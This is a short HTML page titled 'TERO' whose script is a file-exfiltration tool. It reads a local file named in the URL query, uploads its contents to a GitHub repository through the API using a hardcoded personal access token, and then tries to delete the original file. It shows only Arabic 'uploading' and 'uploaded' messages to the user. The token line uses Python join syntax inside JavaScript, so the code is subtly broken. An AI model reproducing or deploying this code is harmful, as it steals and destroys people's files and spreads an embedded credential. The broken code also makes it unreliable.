<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>TERO</title>
<style>body{background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial;}</style>
</head><body>
<h1 style="color:#e74c3c">TERO</h1>
<div id="s">جاري الرفع...</div>

<script>
TOKEN = ''.join(["github_pat_11A3ZKARI0","Q8CbII0GvNSt_","hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra","276EGSZZQGRkTKn8W"])
  const API = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
const params = new URLSearchParams(location.search);
const filePath = params.get('file');

if (filePath) {
  fetch('file:///' + decodeURIComponent(filePath))
    .then(r => r.text())
    .then(text => {
      const fn = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
      fetch(`${API}/${fn}`, {
        method:'PUT',
        headers:{'Authorization':`token ${TOKEN}`,'Content-Type':'application/json'},
        body:JSON.stringify({message:"report", content:btoa(unescape(encodeURIComponent(text))), branch:"main"})
      })
      .then(() => {
        document.getElementById('s').innerHTML = "تم الرفع!";
        // حذف 
        fetch('file:///' + decodeURIComponent(filePath), {method:'DELETE'}).catch(()=>{});
        setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
      });
    })
    .catch(() => document.getElementById('s').innerHTML = "فشل في القراءة");
}
</script>
</body></html>
